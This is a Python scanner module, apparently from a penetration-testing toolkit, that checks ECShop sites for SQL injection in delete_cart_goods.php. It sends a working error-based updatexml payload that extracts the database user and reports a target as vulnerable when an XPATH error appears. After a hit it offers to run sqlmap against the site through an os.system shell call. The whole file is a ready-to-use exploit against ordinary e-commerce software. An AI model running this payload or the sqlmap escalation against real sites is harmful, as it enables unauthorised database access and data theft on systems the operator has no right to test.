#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
from rich.prompt import Prompt
urllib3.disable_warnings()

class EcshopSqlScan:
    def run(self, urls):
        url = urls + '/delete_cart_goods.php'
        data = "id=0||(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))"
        header = {
            "Host": urls.split("://")[-1],
            "User-Agent": self.headers,
            "Content-Type": "application/x-www-form-urlencoded"
        }
        try:
            response = requests.post(url, data=data, headers=header, verify=self.ssl, timeout=self.timeout,proxies=self.proxy)
            if "XPATH" in response.text:
                OutPrintInfoSuc("Ecshop", f'存在Ecshop-SQL漏洞 {url}')
                if self.batch:
                    OutPutFile("ecshop_sql.txt",f'存在Ecshop-SQL漏洞 {url}')
                return True
            else:
                if not self.batch:
                    OutPrintInfo("Ecshop", '不存在Ecshop-SQL漏洞')
                return False
        except Exception:
            if not self.batch:
                OutPrintInfo("Ecshop", '目标请求出错')
            return False

    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        self.headers = target["header"]
        proxy = target["proxy"]
        self.timeout = int(target["timeout"])
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)

        if not self.batch:
            OutPrintInfo("Ecshop",'开始执行Ecshop-SQL检测...')
        
        if self.run(url):
            if not self.batch:
                choose = Prompt.ask("[b yellow]是否调用sqlmap执行检测([b red]y/n[/b red])")
                if choose == "y":
                    import os
                    try:
                        dir = os.getcwd()
                        OutPrintInfo("SqlMap",
                                     f'[b bright_red]Query[/b bright_red]: \n[b magenta]sqlmap -u "{url}/delete_cart_goods.php" -data \"id=0||(updatexml(1,concat(0x7e,(*),0x7e),1))\" --output-dir={dir}/result/ --batch')
                        os.system(
                            f"sqlmap -u \"{url}/delete_cart_goods.php\" -data \"id=0||(updatexml(1,concat(0x7e,(*),0x7e),1))\" --output-dir={dir}/result/ --batch")
                    except Exception as e:
                        OutPrintInfoErr(e)
        if not self.batch:
            OutPrintInfo("Ecshop",'Ecshop-SQL检测执行结束')